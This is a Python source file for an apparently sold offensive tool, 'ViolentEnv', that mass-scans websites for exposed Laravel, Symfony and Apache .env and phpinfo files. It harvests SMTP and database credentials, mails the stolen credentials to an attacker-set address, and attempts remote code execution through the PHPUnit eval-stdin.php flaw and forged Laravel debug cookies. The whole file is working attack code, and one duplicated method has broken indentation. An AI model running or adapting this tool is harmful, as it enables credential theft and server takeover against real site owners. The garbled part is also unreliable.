import requests, os, socket, json, smtplib, hashlib, subprocess, time, re, urllib3
from multiprocessing.dummy import Pool
from colorama import Fore, Back, Style, init
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import regex
import requests, sys, random, time, os, socket, json, smtplib, base64, hashlib, hmac
from Crypto.Cipher import AES
from Crypto import Random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import Fore, Back, Style, init
from multiprocessing.dummy import Pool
import regex
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, unquote, quote_plus
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

if not os.path.exists("ViolentRes"): os.mkdir("ViolentRes")
if not os.path.exists("ViolentRes/Apache"): os.mkdir("ViolentRes/Apache")
if not os.path.exists("ViolentRes/ApacheEnv"): os.mkdir("ViolentRes/ApacheEnv")
if not os.path.exists("ViolentRes/Laravel"): os.mkdir("ViolentRes/Laravel")

init()
def logo ():
    config = json.load(open( "cenv.json", "r" ))
    configp = config['PATH']
    configm = config['MAILTO']
    colors = list(vars(Fore).values())
    os.system(["clear", "cls"][os.name == "nt"])
    logo = """
    _    ________           __      _ __  ______          
    | |  / / ____/  ______  / /___  (_) /_/ ____/_V4__   __
    | | / / __/ | |/_/ __ \/ / __ \/ / __/ __/ / __ \ | / /
    | |/ / /____>  </ /_/ / / /_/ / / /_/ /___/ / / / |/ / 
    |___/_____/_/|_/ .___/_/\____/_/\__/_____/_/ /_/|___/  
                  /_/      
                                                  
    {y}ENV {w}[{g}KILLER{w}] {y}SMTP CRACKER 2022
    {y}METHOD : {w}[{g}LARAVEL ENV + DEBUG ENV + DEBUG RCE + RCE PHPUNIT{w}] {w}[{g}APACHE ENV{w}] {w}[{g}SYMFONY ENV{w}] {w}[{g}OTHER ENV{w}]
    {y}ON PATH : {w}{g}{configpath}{w}  
    {y}AUTO SEND : {w}[{g} {configmail} {w}] 
    """.format(w=Fore.WHITE, g=Fore.GREEN, y=Fore.YELLOW, configpath =configp , configmail = configm)
    for line in logo.splitlines():
        print("".join(colors[random.randint(1, len(colors)-1)]) + line)
        time.sleep(0.05)


def strf ( string ): return string.format(w=Fore.WHITE, g=Fore.GREEN, y=Fore.YELLOW, r=Fore.RED)
def sinput ( msg ): return input( strf( "{w}[{g}+{w}] {y}" + str(msg) + " {w}> ") )
def vcolor ( text ): return text.format(w=Fore.WHITE, g=Fore.GREEN, r=Fore.RED, y=Fore.YELLOW, b=Fore.BLUE, c=Fore.CYAN , re=Fore.LIGHTRED_EX) 
def vinfo ( t, m ): print( vcolor( " {w}[" + t + "{w}] " + m ) )
def spinfo ( msg ): return print( strf( "{w}[{g}!{w}] {w}" + str(msg) ) )
def sperr ( msg, ty ): print( Back.RED + " -- " + str(ty) + " -- " + Style.RESET_ALL + " " + msg )
def spsucc ( msg, ty ): print( Back.GREEN + " --" + str(ty) + "-- " + Style.RESET_ALL + " " + msg ) 

def hardwarecheck():
    # 
    import datetime
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    try:
        hwlists = requests.get("https://rentry.co/2z9on/raw").json()
    # try:
        if hwid not in hwlists: 
            os.system(["clear", "cls"][os.name == 'nt'])
            print( "!", "HWID : " + hwid )
            print( "x", "Your hwid is not registered in violent system ( Auto Closed In 60 Seconds )" )
            print( "!", "If you done buy, send your HWID to Telegram @Violent_Real" )
            input('Click Enter To Exit ')
            sys.exit()
        cdt = regex.findall( "(.*?)-(.*?)-(.*?)T", requests.get("http://worldclockapi.com/api/json/est/now").json()["currentDateTime"])[0]
        hdt = hwlists[hwid].split("-")
        if datetime.date( int(cdt[0]), int(cdt[1]), int(cdt[2]) ) > datetime.date( int(hdt[0]), int(hdt[1]), int(hdt[2]) ):
            print(f" {Fore.RED}[{Fore.WHITE}X{Fore.RED}]{Fore.WHITE}", "Your license is expired" )
            input(f' {Fore.RED}[{Fore.WHITE}>{Fore.RED}]{Fore.WHITE} Click Enter To Continue')
            return 1
        else: 
            print(f" {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE}", "Auth success. Starting script ..." )  
            time.sleep(1)
            #print(f" {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE}", "Creating Read-Me How To Run Txt Files ..." )  
            #instruction = requests.get("https://rentry.co/3cii9/raw")
            #open('How-To-Run-Read-This.txt', 'a').write(instruction.text)
            return 0
    except:
        os.system(["clear", "cls"][os.name == 'nt'])
        print( "x", "System Maintance " + hwid)
        print( "!", "The System Stiil Maintance Check The Update In The Channel" )
        input('Click Enter To Exit ')
        sys.exit()
    return 1
  #  except: return 0

class ViolentEnv () :
    import regex
    config = json.load(open( "cenv.json", "r" ))

    def __init__ ( self, site ):
        self.site = site
        self.result = {}
        self.response = ""
        self.of = ""
        
    def getItemFromResp ( self, item ):
        import regex
        for asu in self.config['REGEX']["DEFAULT"]:
            try:
                get = regex.findall( asu.format( term = item ).replace( "\\\\", "\\" ), self.response.text )[0]
                if get != ( "" or "null" ):
                    if item in self.config["REGEX"]["GETDATA"]: return self.itemValueFilter( item, get, self.config["REGEX"]["GETDATA"][item] )
                    return get
            except: continue
        return ""

    def itemValueFilter ( self, item, data, asu ):
        import regex
        rq = regex.findall( asu.replace("\\\\", "\\"), data )[0]
        if "MAILER" in item:
            if "MAILER_URL" == item: host, port, user, pw = rq
            elif "MAILER_DSN" == item: user, pw, host, port = rq
            return host, port, user, pw     
        if "DATABASE" in item: 
            if "DATABASE_URL" == item: user, pw, host, port = rq
            return user, pw, host, port
        return ""

    def getData ( self ):
        for ty in self.config["VARS"]:
            data = { ty : { } }
            if ty not in self.response.text: continue
            for item in self.config["VARS"][ty]:
                get = self.getItemFromResp( item )
                if isinstance( get, tuple ): data[ty] = self.cvData( ty, get )
                elif isinstance( get, str ) and len( get ) != 0: data[ty].update( { item: get } )
            if len( data[ty] ) != 0: self.result.update( data )
        return 1
   
    def cvData ( self, ty, get ):
        output = {  }
        if ty == "MAILER":
            output.update( { "MAIL_HOST": get[0] } )
            output.update( { "MAIL_PORT": get[1] } )
            output.update( { "MAIL_USER": get[2] } )
            output.update( { "MAIL_PASS": get[3] } )
        elif ty == "DATABASE":
            output.update( { "DB_USER": get[0] } )
            output.update( { "DB_PASSWORD": get[1] } )
            output.update( { "DB_HOST": get[2] } )
            output.update( { "DB_PORT": get[3] } )
        return output
    
    def getEnv ( self ):
        self.getData()
        if len( self.result ) != 0:
            grabbed = ""
            for ty in self.result:
                if ty == "APP": continue
                grabbed += " {} ".format( ty.upper() )
                out = "[ " + ty.upper() + " : " + self.response.url + " ]"
                for item in self.result[ty]: out += "\n" + item + " = " + self.result[ty][item]
                self.filterEmail( out )
                open( "ViolentRes/"+ self.of +"/" + ty.lower() + ".txt", "a" ).write( out + "\n\n" )
            vsucc( self.response.url, grabbed )
            return 1
        return 0

    def filterEmail ( self, res ):
        import regex
        name = ""; inf = ""
        if "email-smtp" in res:
            name = "smtp-aws"
            inf = regex.findall('email-smtp.(.*?).amazonaws.com', res)[0]
        elif "smtp.mail" in res:
            name = "awsapps"
            inf = regex.findall('smtp.mail.(.*?).awsapps.com', res)[0]
        elif "smtp.sendgrid.net" in res: name = "sendgrid" 
        elif 'office365' in res: name = "office365"
        elif '1and1' in res or '1und1' in str(res): name = '1and1'
        elif 'zoho' in res: name = "zoho"
        elif 'mandrillapp' in res: name = "mandrillapp"
        elif 'mailgun' in res: name = "mailgun"
        if inf != "": open("ViolentRes/" + self.of + "/" + inf + ".txt", "a").write( res + "\n\n" )
        if name != "": open( "ViolentRes/" + self.of + "/" + name + ".txt", "a" ).write( res + "\n\n" )
        return 1

    def run ( self ):
        for path in self.config["PATH"]:
            if self.result: break
            self.response = requests.get( self.site + path , timeout = 5 , verify=False)
            
            if "/_profiler/phpinfo" == path: self.of = "Apache" 
            else: self.of = "Laravel"
            
            open( "ViolentRes/sites.txt", "a" ).write( self.response.url + "\n" )
            # try:
            if "PHP Version" in self.response.text or "APP_" in self.response.text: self.getEnv()
            if not self.result:
                self.response = requests.post( self.site, data = {"0x[]": "nopebee7"}, timeout = 5 , verify=False )
                if "APP_" in self.response.text: 
                    self.of = "Laravel"
                    self.getEnv()
                    
            if "MAILER" in self.result: ViolentSmtpTest( self.result["MAILER"], self.config["MAILTO"], self.site ).execute()
            if "MAIL" in self.result: ViolentSmtpTest( self.result["MAIL"], self.config["MAILTO"], self.site ).execute()
            if "APP" in self.result and "APP_" in self.result["APP"] and self.result["APP"]["APP_DEBUG"].lower() == "true":
                ViolentLaravelRCE( self.site, self.config, self.result["APP"] ).DebugRceScaner()
            # except: continue
        if not self.result: return vperr( self.site , "CANT GET" )
        
            def run ( self ):
        for path in self.config["PATH"]:
            if self.result: break
            self.response = requests.get( self.site + path , timeout = 5 , verify=False)
            
            if "/env/dockers/php-apache/.env" == path: self.of = "ApacheEnv" 
            else: self.of = "Laravel"
            
            open( "ViolentRes/sites.txt", "a" ).write( self.response.url + "\n" )
            # try:
            if "PHP Version" in self.response.text or "APP_" in self.response.text: self.getEnv()
            if not self.result:
                self.response = requests.post( self.site, data = {"0x[]": "nopebee7"}, timeout = 5 , verify=False )
                if "APP_" in self.response.text: 
                    self.of = "Laravel"
                    self.getEnv()
                    
            if "MAILER" in self.result: ViolentSmtpTest( self.result["MAILER"], self.config["MAILTO"], self.site ).execute()
            if "MAIL" in self.result: ViolentSmtpTest( self.result["MAIL"], self.config["MAILTO"], self.site ).execute()
            if "APP" in self.result and "APP_" in self.result["APP"] and self.result["APP"]["APP_DEBUG"].lower() == "true":
                ViolentLaravelRCE( self.site, self.config, self.result["APP"] ).DebugRceScaner()
            # except: continue
        if not self.result: return vperr( self.site , "CANT GET" )

class ViolentSmtpTest ():

    def __init__ ( self, data, tomail, site ):
        self.data = data; self.site = site; self.tomail = tomail
        self.smtp = None; self.mode = ""
    
    def connectTls ( self ):
        try: 
            self.smtp = smtplib.SMTP( self.data["MAIL_HOST"], self.data["MAIL_PORT"] )
            self.smtp.ehlo(); self.smtp.starttls(); self.smtp.ehlo()
            self.smtp.login( self.data["MAIL_USER"], self.data["MAIL_PASS"] )
            return 1
        except: self.smtp = None

    def connectSsl ( self ):
        try:
            self.smtp = smtplib.SMTP_SSL( self.data["MAIL_HOST"], self.data["MAIL_PORT"] )
            self.smtp.ehlo(); self.smtp.login( self.data["MAIL_USER"], self.data["MAIL_PASS"] )
            return 1
        except: self.smtp = None

    def send ( self ):
        msg = MIMEMultipart( "alternative" )
        msg["Subject"] = "Its Works!! - ViolentEnv SMTP Test"
        msg["From"] = self.data["MAIL_FROM_ADDRESS"]
        msg["To"] = self.tomail
        msg.attach( MIMEText(
f"""---------- Violent Sender ----------
URL       = {self.site} 
MAIL HOST = {self.data['MAIL_HOST']}
MAIL PORT = {self.data['MAIL_PORT']}
MAIL USER = {self.data['MAIL_USER']}
MAIL PASS = {self.data['MAIL_PASS']}
---------- @Violent_Real -----------""", "plain") )
        try:
            self.smtp.sendmail( self.data["MAIL_FROM_ADDRESS"], self.tomail, msg.as_string() )
            self.smtp.quit()
            return 1
        except: return 0

    def execute ( self ):
        try:
            if ( "MAIL_USERNAME" and "MAIL_PASSWORD" ) in self.data:
                self.data["MAIL_USER"] = self.data["MAIL_USERNAME"]
                self.data["MAIL_PASS"] = self.data["MAIL_PASSWORD"]
            if ( "MAIL_HOST" and "MAIL_PORT" and "MAIL_USER" and "MAIL_PASS" ) not in self.data: return 0
            if "MAIL_FROM_ADDRESS" not in self.data: self.data["MAIL_FROM_ADDRESS"] = self.data["MAIL_USER"]

            if self.connectSsl(): self.mode = "ssl"
            elif self.connectTls(): self.mode = "tls"

            if self.smtp: 
                if not self.send(): open( "ViolentRes/mailsend.log", "a" ).write( self.site + " --> login succes but failed to send\n" )
            else: open( "ViolentRes/mailsend.log", "a" ).write( self.site + " --> cant connect or login failed\n" )
        except: return 0

class ViolentLaravelRCE ():
    
    SIG_SIZE = hashlib.sha256().digest_size
    pad = lambda self, s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
    unpad = lambda self, s: s[0:-ord(s[-1])]

    def __init__ ( self, site, config, data ):
        self.site = site.replace( ".env", "" )
        self.config = config
        self.data = data

    def PHPUnitRCE ( self ):
        response = requests.get( self.site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", data = "<?php phpinfo(); ?>" , timeout = 5 , verify=False )
        if "phpinfo" in response.text:
            inject = requests.get( self.site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", data = self.config["LARAVEL_RCE"]["CMDPHPUNIT"], timeout = 5 , verify=False )
            if "nopebee7" in inject.text: 
                spsucc( self.site + "/vendor/phpunit/phpunit/src/Util/PHP/sh.php", " RCE " )
                open( "ViolentRes/Laravel/shell-phpunit.txt", "w" ).write( self.site + "/vendor/phpunit/phpunit/src/Util/PHP/sh.php --> phpunit rce\n" )
            else: open( "ViolentRes/Laravel/phpunit.txt", "w" ).write( self.site + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <-- Try Manualy" )
        return 1  

    def DebugRceScaner ( self ):
        payloads = self.DebugCraftPayload( "system" )
        session = requests.get( self.site , timeout = 5 , verify=False).cookies.get_dict()["laravel_session"]

        for payload in payloads:
            cookies = { session : quote_plus( payload ) }
            response = requests.get( self.site, cookies = cookies, timeout = 5 , verify=False )
            if "nopebee7" in response.text:
                spsucc( self.site, " RCE DEBUG " )
                open( "ViolentRes/Laravel/Rce-Debug.txt", "w" ).write( self.site + " --> debug rce\n" )
                break
        return

    def DebugCraftPayload ( self, func ):
        appkey = base64.b64decode(self.data["APP_"].split(':')[1]) if "base64" in self.data["APP_"] else self.data["APP_"]
        _flength = len( func ); _plength = len( self.config["LARAVEL_RCE"]["CMDDEBUG"] ); res = []
        for payload in self.config["LARAVEL_RCE"]["PAYLOADS"]:
            payload = unquote( payload
                .replace( "LENGTH_FUNCTION_NAME", str( _flength ) )
                .replace( "%5BFUNCTION_NAME%5D", func )
                .replace( "LENGTH_FUNCTION_PARAMETER", str( _plength ) )
                .replace( "%5BFUNCTION_PARAMETER%5D", self.config["LARAVEL_RCE"]["CMDDEBUG"] )
            )
            msg = self.pad( payload )
            iv = Random.new().read( 16 )
            obj = AES.new( appkey, AES.MODE_CBC, iv )
            value = base64.b64encode( obj.encrypt( msg.encode( "utf8" ) ) )
            iv = base64.b64encode( iv )
            signature = hmac.new( appkey, iv + value, hashlib.sha256 ).hexdigest()
            payload = {}; payload["value"] = value.decode( "utf8" ); payload["iv"] = iv.decode( "utf8" ); payload["mac"] = signature
            res.append( base64.b64encode( json.dumps( payload ).encode( "utf8" ) ) )
        return res

def vfmt ( string ): return string.format(w=Fore.WHITE, g=Fore.GREEN, y=Fore.YELLOW, r=Fore.RED)
def vinpt ( msg ): return input( vfmt( "   {w}[{g}+{w}] {y}" + str(msg) + " {w}> ") )
def vinfo ( msg ): return print( vfmt( "{w}[{g}!{w}] {w}" + str(msg) ) )
def vperr ( msg, ty ): print( Back.RED + " -- " + str(ty) + " -- " + Style.RESET_ALL + " " + msg )
def vsucc ( msg, ty ): print( Back.GREEN + " --" + str(ty) + "-- " + Style.RESET_ALL + " " + msg ) 

def optManager ():
    logo()
    listpath = vinpt( "list path" )
    if os.path.exists( listpath ): sites = open( listpath, "r" ).read().splitlines()
    else: vinfo( "file not found ( error )" ); exit();
    thread = vinpt( "thread {w}({y}default{w}: {y}100{w})" )
    if thread == "": thread = "100"
    return sites, int(thread)

def main ( site ):
    if len( site ) == 0: return
    if not site.startswith("http"): site = "http://" + site

    # try:
    netloc = urlparse( site ).netloc
    socket.gethostbyname( netloc.split(":")[0] if ":" in netloc else netloc )
    venv = ViolentEnv( urlparse( site ).scheme + "://" + urlparse( site ).netloc ).run()
    # except: return vperr( urlparse(site).netloc, "ERROR" )

    return 1

if __name__ == "__main__":
    try:
        vopt = optManager(); init()
            # try:
        try:
            with ThreadPoolExecutor(vopt[1]) as zz:
                zz.map(main, vopt[0])
        except:
            pass
           # proc = Pool( vopt[1] )
          #  proc.map( main, vopt[0] )
            # except: print( "error" )
    except KeyboardInterrupt:
        print('\n Thanks For Using This Tools :)')
        input('Click Enter To Exit')
        try:
            import sys
            sys.exit(0)
        except SystemExit:
            os._exit(0)